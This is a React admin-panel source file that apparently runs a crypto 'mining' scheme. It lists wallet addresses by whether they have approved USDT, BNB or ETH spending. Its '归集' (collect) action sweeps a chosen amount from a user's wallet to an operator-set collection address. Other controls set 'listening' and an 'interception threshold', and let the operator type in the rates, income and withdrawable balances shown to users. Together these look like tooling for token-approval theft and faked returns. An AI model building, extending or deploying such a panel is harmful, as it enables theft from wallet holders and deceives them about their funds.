import { Space, Form, Button, Table, Card, Modal, message, Input, Switch, InputNumber, Row, Col, Spin, Radio } from "antd";
import { SearchOutlined, ReloadOutlined } from "@ant-design/icons";
import { useEffect, useMemo, useState } from "react";
import { SearchFormItem } from "../components";
import { SearchFormItemEnum } from "@/enum";
import { formItemMap } from "@/data";
import { useAntdTableWithForm, useSearchForm } from "@/hooks";
import { getMemberList, updateUserAmount, collect, editCustomer, addPool } from "@/api/member";
import { updateRate, dividend } from '@/api/mining-logs';
import { TableAlert } from "@/pages/components";
import { useResetState } from "ahooks";
import dayjs from "dayjs";
import { useNavigate } from "react-router-dom";
import { AddressTailor } from "@/components";
import { calculate } from '@/utils/index'
import "./index.scss"
import USDTImg from '@/assets/usdt_02.png'
import BNBImg from "@/assets/bnb.png"
import ETHImg from "@/assets/eth.png"




const getAuthorizationSystemStr = (key) => {
  return formItemMap[SearchFormItemEnum.AUTH_STATUS].options.find(
    (item) => item.value === key
  ).label;
};

const mingOptions = [
  {
    value: "0",
    label: "已挖矿",
  },
  {
    value: "1",
    label: "取消挖矿",
  },
]

const columns = [
  {
    title: "用户ID",
    dataIndex: "id",
    textWrap: 'word-break',
    fixed: "left",
    width: 60,
  },
  {
    title: "拦截阈值",
    dataIndex: "thresholdValue",
    align: "center",
    fixed: "left",
    width: 80,
  },
  {
    title: "监听状态",
    align: "center",
    fixed: "left",
    width: 80,
    render: (_, record) => (
      <div className={record.listeningState === "0" ? 'dot dot-green' : 'dot'} title={record.listeningState === "0" ? "已监听" : "未监听"}>
        <div class="content"></div>
        {/* {record.listeningState === "0" ? "已监听" : "未监听"} */}
      </div>
    ),
  },
  {
    title: "授权状态",
    width: 80,
    fixed: "left",
    render: (_, record) => (
      <span 
        className={record.authorizationSystem === "0" ? 'watch authed' : 'watch'}
      >
        {record.authorizationSystem === "0" ? '已授权' : '无'}
      </span>
    ),
  },
  {
    title: "用户地址",
    dataIndex: "address",
    width: 240,
    render: (_, record) => (
      <AddressTailor address={record.address} />
    ),
  },
  {
    title: "用户类型",
    width: 80,
    render: (_, record) => (
      <span>{record.type == '1' ? '高级' : '普通'}</span>
    ),
  },
  {
    title: "资产概览",
    dataIndex: "amountBalance",
    width: 100,
    sorter: (a, b) => a.amountBalance - b.amountBalance,
    render: (_, record) => (
      <div style={{display: "flex",flexDirection: "column"}}>
        <span style={{ color: 'green'}}>钱包 {record.chainType == "BEP20" ? "BNB" : "ETH" }：{record.mineChainTypeAmount || 0}</span>
        <span style={{ color: 'orange'}}>钱包USDT：{record.amountBalance || 0}</span>
      </div>
    ),
  },
  {
    title: "链类型",
    dataIndex: "chainType",
    width: 60,
  },
  {
    title: "代理用户",
    dataIndex: "agercyUser",
    width: 80,
  },
  {
    title: "利率",
    dataIndex: "rate",
    width: 60,
    render:(_,record)=>{
      return <span>{record?.rate}%</span>
    },
  },
  {
    title: "结算周期",
    dataIndex: "timeDay",
    width: 80,
  },
  {
    title: "锁定金额",
    dataIndex: "FreezeAmount",
    width: 80,
  },
  {
    title: "收益总额",
    dataIndex: "sumIncome",
    width: 80,
  },
  {
    title: "今日收益",
    dataIndex: "dayIncome",
    width: 80,
  },
  {
    title: "提现总额",
    dataIndex: "depositAmount",
    width: 80,
  },
  {
    title: "提现余额",
    dataIndex: "depositBalance",
    width: 80,
  },
  {
    title: "剩余天数",
    dataIndex: "",
    width: 80,
    render:(_,record)=>{
      return <span>{record.timeDay - filterTime(record?.createAt)}</span>
    },
  },
  {
    title: '注册时间',
    width: 120,
    render:(_,record)=><span>{dayjs(Number(record?.createAt*1000) || "").format('YYYY-MM-DD HH:mm:ss')}</span>
  },
  {
    title: "挖矿状态",
    dataIndex: "mingType",
    width: 100,
    render: (_, record) => {
      return <span className={record.mineType == "0" ? 'watch authed' : 'watch danged'}>{record.mineType == "0" ? '已挖矿' : '取消挖矿'}</span>
    },
  },
];

const filterTime = (time)=> {
  if(!time) return
  let nowData = new Date().getTime() / 1000
  let _time = nowData - time
  return Math.floor(_time/86400)
}

const renderSearch = [
  SearchFormItemEnum.USER_ADDRESS,
  SearchFormItemEnum.ID,
  SearchFormItemEnum.PROXY,
  SearchFormItemEnum.AUTH_STATUS,
  SearchFormItemEnum.USER_TYPE,
  SearchFormItemEnum.DATE,
];

const MemberList = () => {
  const authority = localStorage.getItem('authority') || '1' //权限状态
  const [memberData,setMemberData] = useState({})
  const [form] = useSearchForm();
  const [collForm] = Form.useForm();
  const [detailForm] = Form.useForm();
  const [rateForm] = Form.useForm();
  const [setInterForm] = Form.useForm();
  const [loading,setLoading] = useState(true)
  const getList = async ()=>{
    let formValue = form.getFieldsValue(true)
    setLoading(true)
    let res = await getMemberList({...formValue,})
    setMemberData(res.data)
    setLoading(false)
    res.data.data.map(item=>{
      if(item.id == record.id){
        setRecord(item)
      }
    })
  }
  useEffect(()=>{
    getList()
  },[])
  const handleSearch = async () => {
    getList()
  }
  const navigate = useNavigate();
  const mergeColumns = useMemo(() => {
    return columns.concat([
      {
        title: "操作",
        fixed: "right",
        width: 150,
        render: (_, record) => (
          <div className="flex" style={{flexWrap: "wrap"}}>
            <span className="btn-text cursor-pointer text-warning mr-2 mt-2" onClick={() => openCustModal(record)}>修改</span>
            {
              record.authorizationSystem == "0" &&
              <>
                <span className="btn-text cursor-pointer text-link mr-2 mt-2" onClick={() => openRateModal(record)}>利率</span>
                <span className="btn-text text-green cursor-pointer mt-2 mr-2" onClick={() => openSendInterModal(record)}>派息</span>
                {
                  authority == '0' ? 
                    <span className="btn-text text-red cursor-pointer mr-2 mt-2" onClick={() => showModal(record)}>归集</span>: null
                }
              </>
            }
            <span className="text-black cursor-pointer btn-text mr-2 mt-2" onClick={()=>{ 
                record.chainType == 'BEP20' ? 
                open(`https://bscscan.com/tokenapprovalchecker?search=${record.address}&utm_source=tokenpocket`,'_blank') :
                open(`https://etherscan.com/address/${record.address}`,'_blank')
              }}>查询</span>
            <span className="btn-text cursor-pointer text-error mr-2 mt-2" onClick={() => handleUpdateAmount(record)}>刷新</span>
            <span className="text-link mr-2 btn-text mt-2" onClick={() => navigate(`/pool/announcement-management?address=${record.address}`)}>公告</span>
          </div>
        ),
      },
    ]);
  }, []);
  const handleUpdateAmount = async (record) => {
    const isUpdateAll = !Boolean(record);
    const options = {};
    if (record?.address) {
      options.address = record?.address;
      options.chainType = record?.chainType;
    }
    setLoading(true)
    try {
      const { code } = await updateUserAmount(options);
      if (code === 200) {
        message.success(`${isUpdateAll ? "所有用户" : "用户"}余额更新成功`);
        setLoading(false)
        handleSearch()
      }
    } catch (error) {
      message.error(`${isUpdateAll ? "所有用户" : "用户"}余额更新失败`);
      console.log(`【pages/member/index.jsx-handleUpdateAmount】error`);
      setLoading(false)
    }
  };

  const openTips = (record)=>{
    setRecord(record)
    setTipsShow(true)
  }

  //添加到质押矿池
  const handleAddPool = async () => {
    const options = {};
    if(record.authorizationSystem != '0'){
      message.error(`用户未授权`);
      return;
    }
    if (record?.address) {
      options.day = 30,
      options.id = record.id
    }
    try {
      const { code } = await addPool(options);
      if (code === 200) {
        message.success('用户成功添加到质押矿池');
        handleSearch()
      }
    } catch (error) {
      message.error('用户成功添加质押矿池失败');
      console.log(`【pages/member/index.jsx-handleUpdateAmount】error`);
    }
  }


  const [isModalOpen, setIsModalOpen] = useState(false);
  const [custModal,setCustModal] = useState(false);
  const [keyboard, setKeyboard] = useState(true);
  const [pagination, setPagination] = useState({
    current: 1,
    pageSize: 10,
    showSizeChanger: true,
    showQuickJumper: true,
    showTotal: (total) => `总共 ${total} 条`
  });
  const showModal = (record) => {
    if(record.authorizationSystem != "0"){
      message.error("该用户未授权");
      return;
    }
    setRecord(record);
    collForm.setFieldsValue({
      amount: Math.floor(record.amountBalance)
    })
    setIsModalOpen(true);
  };

  //打开修改客户弹窗
  const openCustModal = (record) =>{
    setRecord(record)
    setListeningState(record.listeningState)
    setThresholdValue(record.thresholdValue)
    setAuthorizationSystem(record.authorizationSystem)
    detailForm.setFieldsValue({
      timeDay: record.timeDay,
      rate: record.rate,
      freezeAmount: record.FreezeAmount,
      sumIncome: record.sumIncome,
      dayIncome: record.dayIncome,
      depositAmount: record.depositAmount,
      depositBalance: record.depositBalance,
      mineType: record.mineType
    })
    setCustModal(true)
  }

  const handleOk = () => {
    collForm.validateFields().then(async (values) => {
      setIsModalOpen(false);
      handleCollect();
    })
  };

  const handleCancel = () => {
    setIsModalOpen(false);
    resetCord();
    resetAmount();
    collForm.resetFields()
  };

  //关闭修改客户
  const custModalCancel = () => {
    setCustModal(false)
    resetCord()
    resetThresholdValue()
    resetListeningState()
  }

  //修改客户
  const custModalConfirm = async () => {
    const values = detailForm.getFieldsValue()
    try{
      const { code } = await editCustomer({
        id: record?.id || "",
        highType: record.type,
        thresholdValue: listeningState == "0" ? thresholdValue : 0,
        listeningState,
        timeDay: values.timeDay,
        rate: values.rate,
        freezeAmount: values.freezeAmount,
        sumIncome: values.sumIncome,
        dayIncome: values.dayIncome,
        depositAmount: values.depositAmount,
        depositBalance: values.depositBalance,
        mineType: values.mineType,
        authType: authorizationSystem
      })
      if(code == 200){
        message.success("客户修改成功");
        handleSearch()
        setCustModal(false)
      }
    }catch{
      message.error("客户修改失败");
      console.log(`【pages/member/index.jsx-handleCollect】error`);
    }
  }

  

  const [record, setRecord, resetCord] = useResetState({});
  const [amount, setAmount, resetAmount] = useResetState("");
  const [listeningState, setListeningState, resetListeningState] = useResetState("")
  const [thresholdValue, setThresholdValue, resetThresholdValue] = useResetState(1)
  const [authorizationSystem,setAuthorizationSystem] = useState("")
  const [rateModalShow, setRateModalShow] = useState(false)
  const [sendInterModalShow,setSendInterModalShow] = useState(false)
  const [tipsShow,setTipsShow] = useState(false)
  
  const handleCollect = async () => {
    let collectionAddress = localStorage.getItem("collectionAddress")
    if(!collectionAddress){
      message.error("系统未设置归集地址，请先设置归集地址");
      return
    }
    setLoading(true)
    let { amount } = collForm.getFieldsValue()
    try {
      const { code,data } = await collect({
        address: record?.address || "",
        id: record?.id,
        amount: amount,
      });
      if (code === 200) {
        if(data){
          message.success("归集成功");
          handleSearch()
        }else{
          message.error("归集失败");
        }
        collForm.resetFields()
      }
      setAmount(0)
      setLoading(false)
    } catch (error) {
      message.error("归集失败");
      console.log(`【pages/member/index.jsx-handleCollect】error`);
      collForm.resetFields()
      setLoading(false)
    }
  };

  const handlePageSizeChange = (current, newSize) => {
    setPagination({
      ...pagination,
      current: 1, // 重置页码为第一页
      pageSize: newSize, // 更新每页显示的数量
      showTotal: (total) => `总共 ${total} 条`
    });
  };

  const handleChangeTab = (p, f, { field, order }) => {
    
    let capitalType = 0
    if(order == 'descend'){
      capitalType = 1
    }else if(order == 'ascend'){
      capitalType = 2
    }else{
      capitalType = 0
    } 
    console.log(p,"===p")
    console.log(f,"===f")
    console.log(field,order)
    if(!Object.keys(f).length && field,order){
      handleSearch({capitalType})
    }
  }
  
  const handleChange = (pagination, filters, sorter) => {
    setPagination({
      ...pagination,
      showTotal: (total) => `总共 ${total} 条`
    }); // 更新分页信息
  };

  const openRateModal = (record) => {
    console.log(record.rate)
    rateForm.setFieldsValue({
      rate: record.rate
    })
    setRecord(record);
    setRateModalShow(true);
  }

  const rateConfirm = async()=>{
    rateForm.validateFields().then(async (values) => {
      try{
        const { data } = await updateRate({rate:values.rate,id:record?.id})
        if(data){
          message.success("编辑成功")
          handleSearch()
        }else{
          message.error("编辑失败")
        }
        setRateModalShow(false)
        rateForm.resetFields()
      }catch{
        setRateModalShow(false)
        rateForm.resetFields()
      }
    })
  }

  const rateCancel = () => {
    setRateModalShow(false)
    rateForm.resetFields()
  }

  const openSendInterModal = (record) => {
    setRecord(record);
    if(record.type == "1"){
      setInterForm.setFieldsValue({
        sumIncome: Number(calculate("+",record.sumIncome,calculate("*",calculate("+",record.amountBalance || 0, record.FreezeAmount || 0), record.rate || 0)/100)).toFixed(1),
        dayIncome: Number(calculate("*",calculate("+",record.amountBalance || 0, record.FreezeAmount || 0),(record.rate || 0)/100)).toFixed(1),
        depositAmount: Number(record.depositAmount).toFixed(1),
        depositBalance: Number(record.depositBalance).toFixed(1),
  
        sumIncome_tow: Number(record.sumIncome).toFixed(1),
        dayIncome_tow: Number(record.dayIncome).toFixed(1),
        depositAmount_tow: Number(record.depositAmount).toFixed(1),
        depositBalance_tow: Number(record.depositBalance).toFixed(1)
      })
    }else{
      setInterForm.setFieldsValue({
        sumIncome: Number(calculate("+",record.sumIncome,calculate("*",record.amountBalance || 0, record.rate || 0)/100)).toFixed(1),
        dayIncome: Number(calculate("*",record.amountBalance || 0 ,(record.rate || 0)/100)).toFixed(1),
        depositAmount: Number(record.depositAmount).toFixed(1),
        depositBalance: Number(calculate("+",record.depositBalance,calculate("*",record.amountBalance || 0, record.rate || 0)/100)).toFixed(1),
  
        sumIncome_tow: Number(record.sumIncome).toFixed(1),
        dayIncome_tow: Number(record.dayIncome).toFixed(1),
        depositAmount_tow: Number(record.depositAmount).toFixed(1),
        depositBalance_tow: Number(record.depositBalance).toFixed(1)
      })
    }
    setSendInterModalShow(true)
  }

  const sendInterConfirm = () => {
    setInterForm.validateFields().then(async (values) => {
      try{
        let { data } = await dividend({
          id: record.id,
          highType: record.type,
          sumIncome: values.sumIncome,
          dayIncome: values.dayIncome,
          depositAmount: values.depositAmount,
          alreadyIncome: values.depositBalance,
        })
        if(data){
          message.success("派息成功")
          handleSearch()
        }else{
          message.error("派息失败")
        }
        setSendInterModalShow(false)
        setInterForm.resetFields()
      }catch{
        setSendInterModalShow(false)
        setInterForm.resetFields()
      }
    })
  }

  const sendInterCancel = () => {
    setSendInterModalShow(false)
    setInterForm.resetFields()
  }

  

  return (
    <Card className="w-full h-full">
      <Space direction="vertical" style={{ width: "100%" }}>
        <Form layout="inline" form={form}>
          {renderSearch.map((controlType) => (
            <SearchFormItem controlType={controlType} key={controlType} />
          ))}
          <Form.Item>
            <Button
              type="primary"
              icon={<SearchOutlined />}
              onClick={()=>{handleSearch()}}
            >
              查询
            </Button>
            <Button
              type="primary"
              icon={<ReloadOutlined />}
              onClick={() => handleUpdateAmount()}
              style={{background: "rgb(39,94,148)",border: "none",marginLeft: "6px"}}
            >
              更新所有用户钱包余额
            </Button>
          </Form.Item>
        </Form>
        <div className="flex" style={{alignItems: "center"}}>
          <div className="static-item flex" style={{background: "rgb(233,251,240)"}}>
            <img src={USDTImg} alt="" />
            <div className="static-item-info">
              <span >授权USDT</span>
              <span>{memberData?.sumAuthUsdt || 0}</span>
            </div>
          </div>
          <div className="static-item flex" style={{background: "rgb(252,251,223)"}}>
            <img src={BNBImg} alt="" />
            <div className="static-item-info" style={{color: "rgb(83,80,43)"}}>
              <span>授权BNB</span>
              <span>{memberData?.sumAuthBNB || 0}</span>
            </div>
          </div>
          <div className="static-item flex" style={{background: "rgb(254,233,238)"}}>
            <img src={ETHImg} alt="" />
            <div className="static-item-info" style={{color: "rgb(108,18,44)"}}>
              <span>授权ETH</span>
              <span>{memberData?.sumAuthETH || 0}</span>
            </div>
          </div>
          <div className="static-item flex" style={{background: "rgb(233,251,240)"}}>
            <img src={USDTImg} alt="" />
            <div className="static-item-info">
              <span>非授权USDT</span>
              <span>{memberData?.noSumAuthUsdt || 0}</span>
            </div>
          </div>
          <div className="static-item flex" style={{background: "rgb(252,251,223)"}}>
            <img src={BNBImg} alt="" />
            <div className="static-item-info" style={{color: "rgb(83,80,43)"}}>
              <span>非授权BNB</span>
              <span>{memberData?.noSumAuthBNB || 0}</span>
            </div>
          </div>
          <div className="static-item flex" style={{background: "rgb(254,233,238)"}}>
            <img src={ETHImg} alt="" />
            <div className="static-item-info" style={{color: "rgb(108,18,44)"}}>
              <span>非授权ETH</span>
              <span>{memberData?.noSumAuthETH || 0}</span>
            </div>
          </div>
        </div>
        
        {/* <TableAlert
          selectCount={selectCount}
          resetRowSelected={resetRowSelected}
        /> */}
        <Table
          // size="middle"
          // bordered
          columns={mergeColumns}
          dataSource={memberData?.data || []}
          pagination={pagination}
          loading={loading}
          onChange={handleChange}
          onShowSizeChange={handlePageSizeChange}
          scroll={{ x: 1860 }}
          // rowSelection={rowSelection}
        />
      </Space>
      <Modal
        title="归集余额操作"
        open={isModalOpen}
        onOk={handleOk}
        onCancel={handleCancel}
        okText="确定"
        cancelText="关闭"
        width={800}
      >
        <Form form={collForm} labelCol={{span:4}} wrapperCol={{span: 18}}>
          <Form.Item label="用户地址">
            <div>{record?.address}</div>
          </Form.Item>
          <Form.Item 
            label="归集USDT数量"
            name="amount"
            rules={[
              { required: true, message: '请输入归集USDT数量'},
            ]}
          >
            <Input
              type="number"
              placeholder="请输入归集USDT数量"
              onChange={(e) => setAmount(e.target.value)}
            />
          </Form.Item>
        </Form>
      </Modal>
      <Modal
        title="会员详情"
        open={custModal}
        onOk={custModalConfirm}
        onCancel={custModalCancel}
        okText="确定"
        cancelText="关闭"
        width={1200}
      >
        <Spin spinning={loading}>
          <Form form={detailForm} disabled={record.authorizationSystem != "0"}>
            {/* <div className="form-title">基本信息</div> */}
            <Row gutter={8}>
              <Col span={9}>
                <Form.Item label="代理用户">
                  <Input placeholder={record?.agercyUser} disabled />
                </Form.Item>
              </Col>
              <Col span={9}>
                <Form.Item label="链类型">
                  <Input placeholder={record.chainType} disabled />
                </Form.Item>
              </Col>
              <Col span={18}>
                <Form.Item label="用户地址">
                  <Input placeholder={record?.address} disabled />
                </Form.Item>
              </Col>
            </Row>
            {/* <div className="form-title">钱包信息</div> */}
            <Row gutter={12}>
              <Col span={9}>
                <Form.Item label={record.chainType == "BEP20" ? "钱包BNB" : "钱包ETH" }>
                  <Input placeholder={record.mineChainTypeAmount || 0} disabled />
                </Form.Item>
              </Col>
              <Col span={9}>
                <Form.Item label="钱包USDT">
                  <Input placeholder={record.amountBalance || 0} disabled />
                </Form.Item>
              </Col>
              {/* <Col span={6}>
                <span 
                  className="form-text text-link"
                  style={{background: "rgb(39,94,148)",border: "none",color: "#fff"}}
                  
                ></span>
                <Button
                  type="primary"
                  onClick={() => handleUpdateAmount(record)}
                  style={{background: "rgb(39,94,148)",border: "none",marginLeft: "6px",height: "32px"}}
                >
                  更新钱包余额
                </Button>
              </Col> */}
            </Row>
            {/* <div className="form-title">挖矿信息</div> */}
            <Row gutter={12}>
              <Col span={9}>
                <Form.Item label="结算周期" name="timeDay">
                  <Input />
                </Form.Item>
              </Col>
              <Col span={9}>
                <Form.Item label="剩余天数">
                  <Input placeholder={record.timeDay - filterTime(record?.createAt)} disabled />
                </Form.Item>
              </Col>
              <Col span={9}>
                <Form.Item label="利率 (%)" name="rate">
                  <Input />
                </Form.Item>
              </Col>
              <Col span={9}>
                <Form.Item label="锁定金额" name="freezeAmount">
                  <Input />
                </Form.Item>
              </Col>
              <Col span={9}>
                <Form.Item label="收益总额" name="sumIncome">
                  <Input />
                </Form.Item>
              </Col>
              <Col span={9}>
                <Form.Item label="今日收益" name="dayIncome">
                  <Input />
                </Form.Item>
              </Col>
              <Col span={9}>
                <Form.Item label="提现总额" name="depositAmount">
                  <Input />
                </Form.Item>
              </Col>
              <Col span={9}>
                <Form.Item label="可提现余额" name="depositBalance">
                  <Input />
                </Form.Item>
              </Col>
            </Row>
            {/* <div className="form-title">账户信息</div> */}
            <Form.Item label="挖矿设置" name="mineType">
              <Radio.Group options={mingOptions} />
            </Form.Item>
            <Form.Item label="授权状态" name="authorizationSystem">
                <Switch 
                  checkedChildren="已授权" 
                  unCheckedChildren="未授权" 
                  defaultChecked 
                  checked={authorizationSystem == "0" ? true : false}
                  onChange={(e)=>{setAuthorizationSystem(e ? '0': '1')}}
                  disabled={false}
                />
              {/* <span className={record.authorizationSystem === "0" ? 'watch watched' : 'watch'}>{record.authorizationSystem === "0" ? "已授权" : "未授权"}</span> */}
            </Form.Item>
            <Form.Item label="监听状态" name="amount">
              {record.authorizationSystem === "0" ? 
                <Switch 
                  checkedChildren="开启监听" 
                  unCheckedChildren="关闭监听" 
                  defaultChecked 
                  checked={listeningState == "0" ? true : false}
                  onChange={(e)=>{setListeningState(e ? '0': '1')}}
                /> : 
                <span className="watch">未监听，非授权用户</span>
              }
            </Form.Item>
            <Form.Item label="拦截阀值" name="amount">
              {listeningState === "0" ? 
                <InputNumber 
                  min={1} 
                  keyboard={keyboard} 
                  defaultValue={thresholdValue}
                  onChange={(e)=>{setThresholdValue(e)}}
                />: 
                <span className="watch" style={{padding:"8px 12px"}}>先监听再设置阀值</span>
              }
            </Form.Item>
          </Form>
        </Spin>
      </Modal>
      <Modal
        title='修改利率'
        open={rateModalShow}
        onOk={rateConfirm}
        onCancel={rateCancel}
        okText='确定'
        cancelText='关闭'
        width={800}
      >
        <Form form={rateForm}  labelCol={{span:4}} wrapperCol={{span: 18}}>
          <Form.Item 
            label='利率(%)'
            name='rate'
            rules={[{ required: true, message: "请输入利率",}]}
          >
            <Input type="number" 
              placeholder='请输入利率'
            />
          </Form.Item>
        </Form>
      </Modal>
      <Modal
        title={record.type=="1"?'高级矿池派发收益':'派发收益'}
        open={sendInterModalShow}
        onOk={sendInterConfirm}
        onCancel={sendInterCancel}
        okText='确定'
        cancelText='关闭'
        width={800}
      >
        <div className="send-inter-card" style={{height: "260px"}}>
          <div className="item">用户地址: {record.address}</div>
          <div className="item">{record.type == '1' ? '高级' : '普通'}利率: {record.rate}%</div>
          <div className="item">锁定金额: {record.FreezeAmount || 0}</div>
          <div className="item">USDT{record.chainType == "BEP20" ? "(BNB)" : "(ETH)" }: {Number(record.amountBalance).toFixed(1)}</div>
          {
            record.type == "1" ?
            <>
              <div className="item text-red" style={{fontSize: "16px",fongWight:"bold"}}>今日收益金额: {Number(calculate("*",calculate("+",record.amountBalance || 0, record.FreezeAmount || 0),(record.rate || 0)/100)).toFixed(1)}</div>
              <div className="item">高级矿池收益计算公式: {record.chainType == "BEP20" ? "( USDT(BNB) + 锁定金额 )" : "( USDT(ETH) + 锁定金额 )" } * 高级利率</div>
            </>:
            <>
              <div className="item text-red" style={{fontSize: "16px",fongWight:"bold"}}>今日收益金额: {Number(calculate("*",record.amountBalance || 0,(record.rate || 0)/100)).toFixed(1)}</div>
              <div className="item">普通矿池收益计算公式: USDT * 普通利率</div>
            </>
          }
        </div>
        <div className="send-form-box">
          <div className="send-form-item">
            <Form form={setInterForm}  labelCol={{span:7}} wrapperCol={{span: 15}} disabled>
              <div style={{paddingLeft: "10px",marginBottom: "15px", fontWeight: "bold"}}>派发前收益</div>
              <Form.Item label='收益总额(TVL)' name='sumIncome_tow'>
                <Input type="number" 
                  placeholder='请输入收益总额'
                />
              </Form.Item>
              <Form.Item label='今日收益' name='dayIncome_tow'>
                <Input type="number" 
                  placeholder='请输入今日收益'
                />
              </Form.Item>
              <Form.Item label='提现总额' name='depositAmount_tow'>
                <Input type="number" 
                  placeholder='请输入提现总额'
                />
              </Form.Item>
              <Form.Item label='可提现金额' name='depositBalance_tow'>
                <Input type="number" 
                  placeholder='请输入可提现金额'
                />
              </Form.Item>
            </Form>
          </div>
          <div className="send-form-item">
            <Form form={setInterForm}  labelCol={{span:7}} wrapperCol={{span: 15}}>
              <div style={{paddingLeft: "10px",marginBottom: "15px", fontWeight: "bold"}}>派发后收益</div>
              <Form.Item label='收益总额(TVL)' name='sumIncome' rules={[{ required: true, message: '请输入收益总额'},]}>
                  <Input type="number" placeholder='请输入收益总额'/>
                </Form.Item>
                <Form.Item label='今日收益' name='dayIncome' rules={[{ required: true, message: '请输入今日收益'},]}>
                  <Input type="number" 
                    placeholder='请输入今日收益'
                  />
                </Form.Item>
                <Form.Item label='提现总额' name='depositAmount' rules={[{ required: true, message: '请输入提现总额'},]}>
                  <Input type="number" 
                    placeholder='请输入提现总额'
                  />
                </Form.Item>
                <Form.Item label='可提现金额' name='depositBalance' rules={[{ required: true, message: '请输入可提现金额'},]}>
                  <Input type="number" 
                    disabled={record.type == "1" ? true : false}
                    placeholder='请输入可提现金额'
                  />
                </Form.Item>
            </Form>
          </div>
        </div>
      </Modal>
      <Modal okText="确定" cancelText="关闭" title="提示" open={tipsShow} onOk={()=>{handleAddPool();setTipsShow(false)}} onCancel={()=>{setTipsShow(false)}}>
        <div className="text-center text-red">是否确定加入高级矿池?</div>
      </Modal>
    </Card>
  );
};

export default MemberList;
